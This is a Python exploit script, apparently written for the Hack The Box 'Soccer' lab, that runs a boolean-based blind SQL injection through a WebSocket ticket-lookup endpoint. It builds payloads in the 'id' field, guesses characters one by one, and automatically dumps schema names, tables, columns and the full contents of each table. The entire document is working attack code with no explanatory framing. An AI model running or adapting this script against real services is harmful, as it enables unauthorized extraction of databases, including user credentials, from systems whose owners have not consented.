import json, signal, sys
from websocket import create_connection
from pwn import *
import time, string

payloadTemplates = {"DatabasesName":"(select SCHEMA_NAME from information_schema.schemata where schema_name not in ('information_schema','performance_schema','mysql','sys') limit %d,1)",
"TableNames":"(select TABLE_NAME from information_schema.tables where table_schema = '{databaseName}' limit %d,1)",
"ColumnNames":"(select column_name from information_schema.columns where table_schema = '{databaseName}' and table_name = '{tableName}' limit %d,1)",
"ValueNames":"(select concat_ws(',',{columnsName}) from {databaseName}.{tableName} limit %d,1)"}
alphabet = string.printable
ws_server = "ws://soc-player.soccer.htb:9091"
ws = create_connection(ws_server)

def formatOne(s: str, field: str, value: str):
	idx_begin = s.find('{'+field+'}')
	idx_end = idx_begin + len(field) + 2
	return s[:idx_begin] + value + s[idx_end:]

def findValues(payloadTemplate):
	valuesFounded = []

	endOfRows = False
	rowCounter = 0

	while(not endOfRows):
		foundValue = ""
		actualValue.status(foundValue)
		endOfValue = False
		currentPosition = 1
		while(not endOfValue):
			payloadTemplateFormated = payloadTemplate % rowCounter
			for character in alphabet:
				payload = '''"" or binary substr(%s,%d,1) = '%s' -- -''' % (payloadTemplateFormated,currentPosition,character)

				data = {
						"id": payload,
				}

				bar.status(f"Trying {payloadTemplateFormated} with character {character} on position {currentPosition}")

				dataJSON = json.dumps(data)
				ws.send(dataJSON)
				resp = ws.recv()
				if resp != "Ticket Doesn't Exist":
					foundValue += character
					actualValue.status(foundValue)
					currentPosition = currentPosition + 1
					break
				elif character == alphabet[-1]:
					endOfValue = True
					rowCounter = rowCounter + 1
					if currentPosition == 1:
						endOfRows = True
					else:
						valuesFounded.append(foundValue)
						log.info(f"  •{foundValue}")
	return valuesFounded

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)

bar = log.progress("SQLI Boolean based")
bar.status("Starting")
actualValue = log.progress("Actual value")

print("-----------------------------------------------------------------------------------")
log.info("Database names:")
databases = findValues(payloadTemplates["DatabasesName"])
print("-----------------------------------------------------------------------------------")

for database in databases:
	log.info("Table names:")
	tables = findValues(formatOne(payloadTemplates["TableNames"],"databaseName",database))
	print("-----------------------------------------------------------------------------------")

	for table in tables:
		log.info(f"Column names from table {table}:")
		payloadTemplateDatabase = formatOne(payloadTemplates["ColumnNames"], "databaseName", database)
		columns = findValues(formatOne(payloadTemplateDatabase,"tableName",table))
		columnsToConcat = (",".join(columns))
		print("\n")
		log.info(f"Columns: {columnsToConcat}")
		payloadTemplateDatabase = formatOne(payloadTemplates["ValueNames"], "databaseName", database)
		payloadTemplateTable = formatOne(payloadTemplateDatabase,"tableName",table)
		values = findValues(formatOne(payloadTemplateTable,"columnsName",columnsToConcat))
		print("-----------------------------------------------------------------------------------")
